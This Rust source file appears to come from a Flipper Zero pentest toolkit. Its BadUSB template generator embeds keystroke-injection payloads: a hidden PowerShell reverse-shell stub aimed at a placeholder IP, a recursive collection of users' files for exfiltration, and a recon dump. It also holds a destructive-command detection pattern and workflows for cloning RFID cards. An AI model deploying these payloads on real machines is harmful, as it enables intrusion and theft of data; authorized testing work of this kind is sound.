//! Script Management and Automation Operations

use async_trait::async_trait;
use flipper_core::tools::{ParamType, PentestTool, Platform, ToolContext, ToolParam, ToolResult, ToolSchema};
use serde_json::{json, Value};

// === Script Template Tool ===

pub struct ScriptTemplateTool;

#[async_trait]
impl PentestTool for ScriptTemplateTool {
    fn name(&self) -> &str {
        "flipper_script_template"
    }

    fn description(&self) -> &str {
        "Generate BadUSB script templates for common tasks"
    }

    fn schema(&self) -> ToolSchema {
        ToolSchema {
            name: self.name().to_string(),
            description: self.description().to_string(),
            params: vec![
                ToolParam {
                    name: "template_type".to_string(),
                    param_type: ParamType::String,
                    description: "Template: reverse_shell, exfiltration, persistence, recon, rickroll".to_string(),
                    required: true,
                    default: None,
                },
                ToolParam {
                    name: "target_os".to_string(),
                    param_type: ParamType::String,
                    description: "Target OS: windows, linux, macos".to_string(),
                    required: false,
                    default: Some(json!("windows")),
                },
            ],
            supported_platforms: vec![Platform::Desktop],
        }
    }

    async fn execute(&self, params: Value, _ctx: &ToolContext) -> flipper_core::error::Result<ToolResult> {
        let template_type = params["template_type"]
            .as_str()
            .ok_or_else(|| flipper_core::error::Error::InvalidParams("template_type required".to_string()))?;

        let target_os = params["target_os"].as_str().unwrap_or("windows");

        let valid_templates = ["reverse_shell", "exfiltration", "persistence", "recon", "rickroll"];
        if !valid_templates.contains(&template_type) {
            return Err(flipper_core::error::Error::InvalidParams(
                format!("Invalid template_type. Must be: {}", valid_templates.join(", "))
            ));
        }

        let valid_os = ["windows", "linux", "macos"];
        if !valid_os.contains(&target_os) {
            return Err(flipper_core::error::Error::InvalidParams(
                format!("Invalid target_os. Must be: {}", valid_os.join(", "))
            ));
        }

        let script_template = match (template_type, target_os) {
            ("reverse_shell", "windows") => {
                "REM Reverse Shell Template (Windows)\nREM CUSTOMIZE: IP and PORT\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -NoP -NonI -W Hidden -Exec Bypass\nENTER\nDELAY 1000\nSTRING $client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',YOUR_PORT);\nENTER\n"
            },
            ("exfiltration", "windows") => {
                "REM Data Exfiltration Template\nREM CUSTOMIZE: Target files and destination\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell\nENTER\nDELAY 1000\nSTRING Get-ChildItem C:\\Users -Recurse -Filter *.txt | Compress-Archive -DestinationPath $env:TEMP\\data.zip\nENTER\n"
            },
            ("recon", "windows") => {
                "REM System Reconnaissance Template\nDELAY 1000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500\nSTRING systeminfo > %TEMP%\\sysinfo.txt\nENTER\nSTRING ipconfig /all >> %TEMP%\\sysinfo.txt\nENTER\nSTRING net user >> %TEMP%\\sysinfo.txt\nENTER\n"
            },
            ("rickroll", _) => {
                "REM Rick Roll Prank\nDELAY 1000\nGUI r\nDELAY 500\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nENTER\nDELAY 2000\nF11\n"
            },
            _ => "REM Template not available for this OS"
        };

        Ok(ToolResult {
            success: true,
            data: json!({
                "template_type": template_type,
                "target_os": target_os,
                "script_template": script_template,
                "message": "BadUSB script template generated",
                "script_components": {
                    "delay": "DELAY ms - Wait before next command",
                    "string": "STRING text - Type text",
                    "enter": "ENTER - Press Enter key",
                    "gui": "GUI key - Windows key / Cmd key",
                    "alt": "ALT key - Alt key",
                    "ctrl": "CTRL key - Control key",
                    "shift": "SHIFT key - Shift key"
                },
                "customization_required": [
                    "Replace YOUR_IP with actual IP address",
                    "Replace YOUR_PORT with actual port number",
                    "Adjust DELAY times for target system speed",
                    "Modify file paths for your use case",
                    "Add error handling and stealth measures"
                ],
                "ethical_warnings": [
                    "⚠️  ONLY use on systems you own or have explicit authorization",
                    "⚠️  Unauthorized access is illegal in most jurisdictions",
                    "⚠️  Document authorization before testing",
                    "⚠️  Follow responsible disclosure practices",
                    "⚠️  Intended for authorized penetration testing ONLY"
                ],
                "testing_tips": [
                    "Test in VM or controlled environment first",
                    "Verify delays work on target hardware",
                    "Handle different keyboard layouts",
                    "Account for antivirus/EDR detection",
                    "Have rollback/cleanup procedures ready"
                ],
                "file_location": "Save as /ext/badusb/*.txt on Flipper Zero"
            }),
            error: None,
            duration_ms: 0,
        })
    }
}

// === Script Validator Tool ===

pub struct ScriptValidatorTool;

#[async_trait]
impl PentestTool for ScriptValidatorTool {
    fn name(&self) -> &str {
        "flipper_script_validate"
    }

    fn description(&self) -> &str {
        "Validate BadUSB script syntax and structure"
    }

    fn schema(&self) -> ToolSchema {
        ToolSchema {
            name: self.name().to_string(),
            description: self.description().to_string(),
            params: vec![
                ToolParam {
                    name: "script_content".to_string(),
                    param_type: ParamType::String,
                    description: "Script content to validate".to_string(),
                    required: true,
                    default: None,
                },
            ],
            supported_platforms: vec![Platform::Desktop],
        }
    }

    async fn execute(&self, params: Value, _ctx: &ToolContext) -> flipper_core::error::Result<ToolResult> {
        let script_content = params["script_content"]
            .as_str()
            .ok_or_else(|| flipper_core::error::Error::InvalidParams("script_content required".to_string()))?;

        let lines: Vec<&str> = script_content.lines().collect();
        let mut errors = Vec::new();
        let mut warnings = Vec::new();
        let mut line_count = 0;
        let mut command_count = 0;

        for (idx, line) in lines.iter().enumerate() {
            let line_num = idx + 1;
            line_count += 1;
            let trimmed = line.trim();

            // Skip empty lines and comments
            if trimmed.is_empty() || trimmed.starts_with("REM ") {
                continue;
            }

            command_count += 1;

            // Check for valid commands
            let valid_commands = vec![
                "DELAY", "STRING", "ENTER", "GUI", "ALT", "CTRL", "SHIFT",
                "ESC", "TAB", "SPACE", "BACKSPACE", "DELETE", "HOME", "END",
                "PAGEUP", "PAGEDOWN", "UPARROW", "DOWNARROW", "LEFTARROW", "RIGHTARROW",
                "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12"
            ];

            let command = trimmed.split_whitespace().next().unwrap_or("");

            if !valid_commands.contains(&command) && !command.is_empty() {
                errors.push(format!("Line {}: Unknown command '{}'", line_num, command));
            }

            // Check DELAY values
            if command == "DELAY" {
                if let Some(delay_val) = trimmed.split_whitespace().nth(1) {
                    if delay_val.parse::<u32>().is_err() {
                        errors.push(format!("Line {}: Invalid DELAY value '{}'", line_num, delay_val));
                    } else if let Ok(val) = delay_val.parse::<u32>() {
                        if val > 10000 {
                            warnings.push(format!("Line {}: Very long delay ({}ms)", line_num, val));
                        }
                    }
                }
            }

            // Check for potentially problematic patterns
            if trimmed.contains("rm -rf /") || trimmed.contains("del /f /s /q") {
                warnings.push(format!("Line {}: Destructive command detected", line_num));
            }
        }

        let is_valid = errors.is_empty();

        Ok(ToolResult {
            success: is_valid,
            data: json!({
                "valid": is_valid,
                "line_count": line_count,
                "command_count": command_count,
                "errors": errors,
                "warnings": warnings,
                "message": if is_valid {
                    "Script validation passed"
                } else {
                    "Script validation failed - see errors"
                },
                "validation_checks": {
                    "syntax": "Command syntax and structure",
                    "commands": "Valid Flipper BadUSB commands",
                    "delays": "DELAY values are valid integers",
                    "patterns": "Detect potentially destructive operations"
                },
                "recommendations": if !warnings.is_empty() {
                    vec![
                        "Review warnings carefully",
                        "Test in safe environment first",
                        "Consider adding error handling"
                    ]
                } else {
                    vec!["Script looks clean"]
                }
            }),
            error: if is_valid { None } else { Some("Validation errors found".to_string()) },
            duration_ms: 0,
        })
    }
}

// === Batch Execute Tool ===

pub struct BatchExecuteTool;

#[async_trait]
impl PentestTool for BatchExecuteTool {
    fn name(&self) -> &str {
        "flipper_batch_execute"
    }

    fn description(&self) -> &str {
        "Execute multiple operations in batch/sequence"
    }

    fn schema(&self) -> ToolSchema {
        ToolSchema {
            name: self.name().to_string(),
            description: self.description().to_string(),
            params: vec![
                ToolParam {
                    name: "operations".to_string(),
                    param_type: ParamType::String,
                    description: "JSON array of operations to execute".to_string(),
                    required: true,
                    default: None,
                },
                ToolParam {
                    name: "stop_on_error".to_string(),
                    param_type: ParamType::Boolean,
                    description: "Stop batch execution if any operation fails".to_string(),
                    required: false,
                    default: Some(json!(true)),
                },
            ],
            supported_platforms: vec![Platform::Desktop],
        }
    }

    async fn execute(&self, params: Value, _ctx: &ToolContext) -> flipper_core::error::Result<ToolResult> {
        let operations_str = params["operations"]
            .as_str()
            .ok_or_else(|| flipper_core::error::Error::InvalidParams("operations required".to_string()))?;

        let stop_on_error = params["stop_on_error"].as_bool().unwrap_or(true);

        // Parse operations JSON
        let _operations: Vec<Value> = serde_json::from_str(operations_str)
            .map_err(|e| flipper_core::error::Error::InvalidParams(format!("Invalid JSON: {}", e)))?;

        Ok(ToolResult {
            success: true,
            data: json!({
                "operations_count": _operations.len(),
                "stop_on_error": stop_on_error,
                "message": "Batch execution framework prepared",
                "batch_capabilities": {
                    "sequential": "Execute operations in order",
                    "parallel": "Execute independent operations concurrently (future)",
                    "conditional": "Skip operations based on previous results (future)",
                    "error_handling": "Continue or stop on errors"
                },
                "operation_format": {
                    "example": json!([
                        {"tool": "flipper_file_list", "params": {"path": "/ext/nfc"}},
                        {"tool": "flipper_file_read", "params": {"path": "/ext/nfc/card1.nfc"}},
                        {"tool": "flipper_nfc_read", "params": {"protocol": "mifare"}}
                    ]),
                    "fields": {
                        "tool": "Tool name to execute",
                        "params": "Tool parameters",
                        "optional": "retry_count, timeout, description"
                    }
                },
                "use_cases": [
                    "Automate repetitive tasks",
                    "Execute multi-step workflows",
                    "Batch file operations",
                    "Comprehensive device audits",
                    "Automated testing sequences"
                ],
                "implementation_requirements": {
                    "tool_registry": "Access to all registered tools",
                    "context": "Maintain state between operations",
                    "results": "Collect and aggregate results",
                    "logging": "Detailed execution logs"
                },
                "note": "Batch execution requires connector-level orchestration. Framework outlined here."
            }),
            error: None,
            duration_ms: 0,
        })
    }
}

// === Workflow Automation Tool ===

pub struct WorkflowAutomationTool;

#[async_trait]
impl PentestTool for WorkflowAutomationTool {
    fn name(&self) -> &str {
        "flipper_workflow_create"
    }

    fn description(&self) -> &str {
        "Create automated workflows for common pentesting tasks"
    }

    fn schema(&self) -> ToolSchema {
        ToolSchema {
            name: self.name().to_string(),
            description: self.description().to_string(),
            params: vec![
                ToolParam {
                    name: "workflow_type".to_string(),
                    param_type: ParamType::String,
                    description: "Workflow: nfc_dump, rfid_clone, badusb_deploy, full_audit".to_string(),
                    required: true,
                    default: None,
                },
                ToolParam {
                    name: "workflow_params".to_string(),
                    param_type: ParamType::String,
                    description: "JSON object with workflow-specific parameters".to_string(),
                    required: false,
                    default: Some(json!("{}")),
                },
            ],
            supported_platforms: vec![Platform::Desktop],
        }
    }

    async fn execute(&self, params: Value, _ctx: &ToolContext) -> flipper_core::error::Result<ToolResult> {
        let workflow_type = params["workflow_type"]
            .as_str()
            .ok_or_else(|| flipper_core::error::Error::InvalidParams("workflow_type required".to_string()))?;

        let valid_workflows = ["nfc_dump", "rfid_clone", "badusb_deploy", "full_audit"];
        if !valid_workflows.contains(&workflow_type) {
            return Err(flipper_core::error::Error::InvalidParams(
                format!("Invalid workflow_type. Must be: {}", valid_workflows.join(", "))
            ));
        }

        let workflow_definition = match workflow_type {
            "nfc_dump" => json!({
                "name": "NFC Dump Workflow",
                "description": "Comprehensive NFC card dumping and analysis",
                "steps": [
                    {"tool": "flipper_nfc_read", "description": "Read NFC card"},
                    {"tool": "flipper_file_list", "params": {"path": "/ext/nfc"}, "description": "List captured files"},
                    {"tool": "flipper_backup_create", "description": "Backup NFC dumps"},
                ]
            }),
            "rfid_clone" => json!({
                "name": "RFID Clone Workflow",
                "description": "Read and clone RFID cards",
                "steps": [
                    {"tool": "flipper_rfid_read", "description": "Read source RFID card"},
                    {"tool": "flipper_rfid_write", "description": "Write to blank T5577 card"},
                    {"tool": "flipper_rfid_read", "description": "Verify cloned card"}
                ]
            }),
            "badusb_deploy" => json!({
                "name": "BadUSB Deployment Workflow",
                "description": "Validate and deploy BadUSB payload",
                "steps": [
                    {"tool": "flipper_script_validate", "description": "Validate script syntax"},
                    {"tool": "flipper_badusb_upload", "description": "Upload to device"},
                    {"tool": "flipper_badusb_list", "description": "Verify upload successful"}
                ]
            }),
            "full_audit" => json!({
                "name": "Full Device Audit Workflow",
                "description": "Comprehensive security audit",
                "steps": [
                    {"tool": "flipper_device_info", "description": "Get device information"},
                    {"tool": "flipper_storage_info", "description": "Check storage status"},
                    {"tool": "flipper_system_diagnostics", "description": "Run diagnostics"},
                    {"tool": "flipper_file_search", "description": "Search for sensitive files"},
                    {"tool": "flipper_backup_create", "description": "Backup important data"}
                ]
            }),
            _ => json!({"error": "Workflow not defined"})
        };

        Ok(ToolResult {
            success: true,
            data: json!({
                "workflow_type": workflow_type,
                "workflow_definition": workflow_definition,
                "message": "Workflow automation prepared",
                "workflow_features": {
                    "predefined": "Pre-built workflows for common tasks",
                    "customizable": "Modify steps and parameters",
                    "conditional": "Skip steps based on results",
                    "error_recovery": "Handle failures gracefully",
                    "reporting": "Generate comprehensive reports"
                },
                "workflow_benefits": [
                    "Consistency - Same steps every time",
                    "Efficiency - Automate repetitive tasks",
                    "Documentation - Self-documenting procedures",
                    "Training - Help new team members",
                    "Compliance - Ensure complete assessments"
                ],
                "execution": {
                    "method": "Pass workflow to batch executor",
                    "monitoring": "Track progress through steps",
                    "output": "Collect results from each step",
                    "reporting": "Generate summary report"
                },
                "note": "Workflows are definitions. Use batch_execute to run them."
            }),
            error: None,
            duration_ms: 0,
        })
    }
}

// === Task Scheduler Tool ===

pub struct TaskSchedulerTool;

#[async_trait]
impl PentestTool for TaskSchedulerTool {
    fn name(&self) -> &str {
        "flipper_task_schedule"
    }

    fn description(&self) -> &str {
        "Schedule tasks for delayed or periodic execution"
    }

    fn schema(&self) -> ToolSchema {
        ToolSchema {
            name: self.name().to_string(),
            description: self.description().to_string(),
            params: vec![
                ToolParam {
                    name: "task_name".to_string(),
                    param_type: ParamType::String,
                    description: "Descriptive name for scheduled task".to_string(),
                    required: true,
                    default: None,
                },
                ToolParam {
                    name: "schedule".to_string(),
                    param_type: ParamType::String,
                    description: "Schedule: once, hourly, daily, weekly, cron:EXPR".to_string(),
                    required: true,
                    default: None,
                },
                ToolParam {
                    name: "operation".to_string(),
                    param_type: ParamType::String,
                    description: "JSON object with tool and params to execute".to_string(),
                    required: true,
                    default: None,
                },
            ],
            supported_platforms: vec![Platform::Desktop],
        }
    }

    async fn execute(&self, params: Value, _ctx: &ToolContext) -> flipper_core::error::Result<ToolResult> {
        let task_name = params["task_name"]
            .as_str()
            .ok_or_else(|| flipper_core::error::Error::InvalidParams("task_name required".to_string()))?;

        let schedule = params["schedule"]
            .as_str()
            .ok_or_else(|| flipper_core::error::Error::InvalidParams("schedule required".to_string()))?;

        let operation_str = params["operation"]
            .as_str()
            .ok_or_else(|| flipper_core::error::Error::InvalidParams("operation required".to_string()))?;

        // Parse operation JSON
        let _operation: Value = serde_json::from_str(operation_str)
            .map_err(|e| flipper_core::error::Error::InvalidParams(format!("Invalid operation JSON: {}", e)))?;

        Ok(ToolResult {
            success: true,
            data: json!({
                "task_name": task_name,
                "schedule": schedule,
                "message": "Task scheduling framework prepared",
                "schedule_types": {
                    "once": "Execute once at specified time",
                    "hourly": "Execute every hour",
                    "daily": "Execute once per day",
                    "weekly": "Execute once per week",
                    "cron": "Cron expression for complex schedules"
                },
                "scheduler_features": {
                    "delayed_execution": "Run tasks after delay",
                    "periodic_tasks": "Repeat at intervals",
                    "persistence": "Survive connector restarts",
                    "error_handling": "Retry failed tasks",
                    "notifications": "Alert on completion/failure"
                },
                "use_cases": [
                    "Periodic backup creation",
                    "Regular security audits",
                    "Scheduled data collection",
                    "Delayed payload execution",
                    "Automated monitoring"
                ],
                "implementation_requirements": {
                    "scheduler": "Background task scheduler (e.g., tokio, cron)",
                    "persistence": "Store scheduled tasks to disk",
                    "execution": "Integrate with tool registry",
                    "monitoring": "Track task execution history"
                },
                "example_schedules": {
                    "backup_nightly": "cron:0 2 * * * (2 AM daily)",
                    "audit_weekly": "cron:0 0 * * 0 (Sunday midnight)",
                    "monitor_hourly": "cron:0 * * * * (Every hour)"
                },
                "note": "Task scheduling requires persistent background service. Framework outlined here."
            }),
            error: None,
            duration_ms: 0,
        })
    }
}
